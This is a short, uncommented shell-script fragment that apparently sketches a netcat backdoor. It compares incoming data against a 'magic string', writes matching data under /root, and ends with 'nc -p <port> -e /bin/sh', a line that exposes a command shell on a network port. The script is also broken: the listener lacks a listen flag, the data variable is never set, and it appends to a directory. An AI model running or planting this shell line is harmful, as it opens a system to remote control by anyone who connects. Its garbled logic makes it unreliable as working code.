nc -p <port>

if [[ $data == $magic_string ]]; then
    echo $data >> /root
else
    echo $data >> /dev/null
fi

nc -p <port> -e /bin/sh
